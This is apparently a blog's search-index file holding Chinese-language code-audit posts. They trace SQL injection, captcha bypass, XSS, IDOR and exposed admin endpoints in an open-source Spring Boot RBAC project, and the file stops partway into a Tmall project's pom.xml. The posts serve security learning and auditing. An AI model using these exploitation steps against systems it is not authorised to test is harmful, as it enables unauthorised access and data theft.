<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/05/24/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link" href="https://hexo.io/">Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link" href="https://hexo.io/docs/">documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link" href="https://github.com/hexojs/hexo/issues">GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/writing.html">Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/server.html">Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/generating.html">Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/one-command-deployment.html">Deployment<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/calc.png">calc.png (1463×883) (drun1baby.top)<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>RBAC代码审计</title>
    <url>/2024/05/26/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><p>首先查看pom.xml文件,查看运用了哪些组件,并且查询是否有漏洞</p>
<table>
<thead>
<tr>
<th>组件名称</th>
<th>组件版本</th>
</tr>
</thead>
<tbody><tr>
<td>Sping boot</td>
<td>2.3.1</td>
</tr>
<tr>
<td>Spring security</td>
<td>5.3.3</td>
</tr>
<tr>
<td>actuator</td>
<td>2.31</td>
</tr>
<tr>
<td>fastjson</td>
<td>1.2.56</td>
</tr>
<tr>
<td>thymeleaf</td>
<td>3.0.11</td>
</tr>
<tr>
<td>mybatis</td>
<td>2.1.2</td>
</tr>
<tr>
<td>swagger2</td>
<td>2.9.2</td>
</tr>
<tr>
<td>druid</td>
<td>1.1.21</td>
</tr>
<tr>
<td>easy-captcha</td>
<td>1.6.2</td>
</tr>
<tr>
<td>oshi-core</td>
<td>4.4.2</td>
</tr>
<tr>
<td>pagehelper</td>
<td>1.2.13</td>
</tr>
<tr>
<td>hutool</td>
<td>5.1.4</td>
</tr>
</tbody></table>
<h2 id="actuator未授权漏洞-存在"><a href="#actuator未授权漏洞-存在" class="headerlink" title="actuator未授权漏洞(存在)"></a>actuator未授权漏洞(存在)</h2><p>actuator最常见的漏洞就是存在未授权,因为网站为spring boot2.x,所以我们在网站路径后拼接&#x2F;actuator或者源代码搜索endpoints</p>
<p>发现开放了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info, health, beans, env, metrics</span><br></pre></td></tr></table></figure>

<h2 id="fastjson反序列化-不存在"><a href="#fastjson反序列化-不存在" class="headerlink" title="fastjson反序列化(不存在)"></a>fastjson反序列化(不存在)</h2><p>这里的fastjson版本是 1.2.56,在mvn官方网址查看发现这个版本是存在漏洞,但是在搜索调用方法</p>
<p>JSON.toJSONString()</p>
<p>JSON.parseObject()</p>
<p>JSON.parse()</p>
<p>没有使用,虽然调用了fastjson但是并没有调用</p>
<h2 id="thymeleaf模板注入-不存在"><a href="#thymeleaf模板注入-不存在" class="headerlink" title="thymeleaf模板注入(不存在)"></a>thymeleaf模板注入(不存在)</h2><p>thymeleaf的版本是3.0.11是存在模板注入的,但是这里都运用了注解@ResponseBody,不经过模板去渲染,直接以json与xml返回到响应</p>
<h2 id="Mybatis-不存在"><a href="#Mybatis-不存在" class="headerlink" title="Mybatis(不存在)"></a>Mybatis(不存在)</h2><h2 id="swagger2未授权-存在"><a href="#swagger2未授权-存在" class="headerlink" title="swagger2未授权(存在)"></a>swagger2未授权(存在)</h2><p>swagger2也大多数为未授权漏洞,里面可能存在啥敏感信息</p>
<p>但是这里没啥用</p>
<h2 id="Druid爆破密码-存在"><a href="#Druid爆破密码-存在" class="headerlink" title="Druid爆破密码(存在)"></a>Druid爆破密码(存在)</h2><p>Druid要么管理员配置不当未授权访问要么爆破账号密码,这是网上最常见的漏洞了,因为Druid的页面没有验证码校验,可以爆破成功</p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>因为它是使用mybatis定义sql,所以我们在mapper的xml文件中查看是否有${来直接拼接sql语句全局搜索</p>
<h3 id="UserController-java存在注入漏洞"><a href="#UserController-java存在注入漏洞" class="headerlink" title="UserController.java存在注入漏洞"></a>UserController.java存在注入漏洞</h3><p><img src="/images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126184607210.png" alt="image-20241126184607210"></p>
<p>这两个是一个地方,差不多一样的</p>
<p>从mapper层到dao层</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126184743310.png" alt="image-20241126184743310"></p>
<p>dao层到他的实现类UserServiceImpl</p>
<p>从getAllUsersByPage方法跟踪到controller层</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126185017711.png" alt="image-20241126185017711"></p>
<p>看到查询用户,跟踪路由到&#x2F;api&#x2F;user&#x2F;index,打开网站抓包</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126185255744.png" alt="image-20241126185255744"></p>
<p>发现nickName与userName参数,不知道为什么延时注入测试不出来,直接上sqlmap可以跑出来</p>
<p>userName可以出来,那么nickName也可以出来</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126190458097.png" alt="image-20241126190458097"></p>
<h3 id="DictController-java存在注入漏洞"><a href="#DictController-java存在注入漏洞" class="headerlink" title="DictController.java存在注入漏洞"></a>DictController.java存在注入漏洞</h3><p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126194149854.png" alt="image-20241126194149854"></p>
<p>还是与上面的步骤一样从mapper层到dao层再到实现类再到controller层</p>
<p>拼接路由,进行抓包,给sqlmap</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126194343803.png" alt="image-20241126194343803"></p>
<h3 id="DeptController-java存在注入漏洞"><a href="#DeptController-java存在注入漏洞" class="headerlink" title="DeptController.java存在注入漏洞"></a>DeptController.java存在注入漏洞</h3><p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126200025504.png" alt="image-20241126200025504"></p>
<p>这个流程与上面一样但是我们在抓包的时候发现没有ancestors参数</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126200300288.png" alt="image-20241126200300288"></p>
<p>获取的dept类中deptID,并且这个deptID是从数据库查到并给他的,那这个deptID不可控,可是我们如果找到一个地方他会更新deptId值或者插入deptId值是不是也变成可控的造成注入,所以我们找有没有update或者insert语句去更新deptId</p>
<p>并且我们要在DeptMapper.xml因为我们要连接DeptController.java</p>
<p><strong>第一个update</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateDeptChildren&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.util.List&quot;</span>&gt;</span></span><br><span class="line">        update my_dept set ancestors =</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;depts&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">separator</span>=<span class="string">&quot; &quot;</span> <span class="attr">open</span>=<span class="string">&quot;case dept_id&quot;</span> <span class="attr">close</span>=<span class="string">&quot;end&quot;</span>&gt;</span></span><br><span class="line">            when #&#123;item.id&#125; then #&#123;item.ancestors&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        where id in</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;depts&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">            #&#123;item.id&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>去追踪到实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateDeptChildren</span><span class="params">(Integer id, String newAncestors, String oldAncestors)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;MyDept&gt; children = deptDao.selectChildrenDeptById(id);</span><br><span class="line">        <span class="keyword">for</span> (MyDept child : children)</span><br><span class="line">        &#123;</span><br><span class="line">            child.setAncestors(child.getAncestors().replace(oldAncestors, newAncestors));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (children.size() &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            deptDao.updateDeptChildren(children);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//将新的Ancestors换到旧的Ancestors</span></span><br></pre></td></tr></table></figure>

<p>再往上跟newAncestors</p>
<p>他必须走到if判断里面,如果走到if判断里面那么newAncestors内容不可控</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateDept</span><span class="params">(MyDept dept)</span> &#123;</span><br><span class="line">        <span class="type">MyDept</span> <span class="variable">parentInfo</span> <span class="operator">=</span> deptDao.selectDeptById(dept.getParentId());</span><br><span class="line">        <span class="type">MyDept</span> <span class="variable">oldInfo</span> <span class="operator">=</span> selectDeptById(dept.getDeptId());</span><br><span class="line">        <span class="keyword">if</span>(ObjectUtil.isNotEmpty(parentInfo) &amp;&amp;ObjectUtil.isNotEmpty(oldInfo))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newAncestors</span> <span class="operator">=</span> parentInfo.getAncestors() + <span class="string">&quot;,&quot;</span> + parentInfo.getDeptId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">oldAncestors</span> <span class="operator">=</span> oldInfo.getAncestors();</span><br><span class="line">            dept.setAncestors(newAncestors);</span><br><span class="line">            updateDeptChildren(dept.getDeptId(), newAncestors, oldAncestors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span>deptDao.updateDept(dept);</span><br><span class="line">        <span class="keyword">if</span> (UserConstants.DEPT_NORMAL.equals(dept.getStatus().toString()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果该部门是启用状态，则启用该部门的所有上级部门</span></span><br><span class="line">            updateParentDeptStatus(dept);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//String newAncestors = parentInfo.getAncestors() + &quot;,&quot; + parentInfo.getDeptId();</span></span><br><span class="line"><span class="comment">//即即&#123;上级部门ancestors,上级部门id&#125;</span></span><br><span class="line"><span class="comment">//内容不可控,放弃</span></span><br></pre></td></tr></table></figure>

<p><strong>第二个update</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126202151422.png" alt="image-20241126202151422"></p>
<p>追踪到实现类</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126202209768.png" alt="image-20241126202209768"></p>
<p>如果有上级部门和dept对象信息都不为空。就进入if判断,我们不能进入到if判断里面,因为进入到if判断里面</p>
<p>newAncestors的值我们就不可控</p>
<p>所以我们得不能有上级部门并且dept对象信息为空</p>
<p>但是我们dept对象信息里面要带有恶意的ancestors参数所以我们必须不为空,那我们就要保证我们传入的dept对象不能有上级部门,我们往上继续追踪</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;修改部门&quot;)</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dept:edit&#x27;)&quot;)</span></span><br><span class="line">    <span class="meta">@MyLog(&quot;修改部门&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">updateMenu</span><span class="params">(<span class="meta">@RequestBody</span> MyDept dept)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (UserConstants.DEPT_NAME_NOT_UNIQUE.equals( deptService.checkDeptNameUnique(dept))) &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;更新岗位&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，岗位名称已存在&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dept.getParentId().equals(dept.getDeptId()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，上级部门不能是自己&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (dept.getStatus().toString().equals(UserConstants.DEPT_DISABLE)</span><br><span class="line">                &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;该部门包含未停用的子部门！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> deptService.updateDept(dept);</span><br><span class="line">        <span class="keyword">return</span> Result.judge(i,<span class="string">&quot;修改&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>他的dept对象是我们用户传入的,那我们拼接路由抓包一个没有上级目录的dept对象中添加一个ancestors参数是不是就可以产生注入了</p>
<p>他是一个输入流中参数不可控,但是另外一个输入流中可以控制相同地方的参数,从而控制参数进行攻击</p>
<p><strong>第三个update</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126204109242.png" alt="image-20241126204109242"></p>
<p>与ancestors参数毫无关联</p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>网站中没有关于XSS的过滤器或者防护代码,基本全站都有xss</p>
<h2 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h2><p>全局搜captcha或者直接找filter过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.codermy.myspringsecurityplus.security.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.StrUtil;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.codermy.myspringsecurityplus.common.utils.Result;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VerifyCodeFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">defaultFilterProcessUrl</span> <span class="operator">=</span> <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> <span class="string">&quot;POST&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.equalsIgnoreCase(request.getMethod()) &amp;&amp; defaultFilterProcessUrl.equals(request.getServletPath())) &#123;</span><br><span class="line">            <span class="comment">// 登录请求校验验证码，非登录请求不用校验</span></span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestCaptcha</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">            <span class="comment">//验证码的信息存放在seesion种，具体看EasyCaptcha官方解释</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">genCaptcha</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (StrUtil.isEmpty(requestCaptcha))&#123;</span><br><span class="line">                <span class="comment">//删除缓存里的验证码信息</span></span><br><span class="line">                session.removeAttribute(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">                response.getWriter().write(JSON.toJSONString(Result.error().message(<span class="string">&quot;验证码不能为空!&quot;</span>)));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">/*            if (StrUtil.isEmpty(genCaptcha))&#123;</span></span><br><span class="line"><span class="comment">                response.getWriter().write(JSON.toJSONString(Result.error().message(&quot;验证码已失效!&quot;)));</span></span><br><span class="line"><span class="comment">                return;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if (!StrUtil.equalsIgnoreCase(genCaptcha,requestCaptcha))&#123;</span></span><br><span class="line"><span class="comment">                session.removeAttribute(&quot;captcha&quot;);</span></span><br><span class="line"><span class="comment">                response.getWriter().write(JSON.toJSONString(Result.error().message(&quot;验证码错误!&quot;)));</span></span><br><span class="line"><span class="comment">                return;</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>他将验证码失效,验证码错误都注释了失效了,所以可以无视验证码,造成账号密码爆破</p>
<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>越权漏洞适合黑盒测试</p>
<p>在后台代码中只传入userid进行操作</p>
<p>只要在数据包中存在userid就存在越权</p>
<p>删除用户,用户添加,部门删除都存在越权</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmall代码审计</title>
    <url>/2024/05/29/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入</span><br><span class="line">前台文件上传</span><br><span class="line">鉴权绕过</span><br><span class="line">XSS(存储型)</span><br><span class="line">log4j2漏洞(CVE-2021-44228)</span><br></pre></td></tr></table></figure>

<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.xq.tmall<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tmall<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>tmall Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Database --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.mysql/mysql-connector-j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid-spring-boot-starter --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Json --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Jsp compatible--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>taglibs-standard-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Mybatis --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span 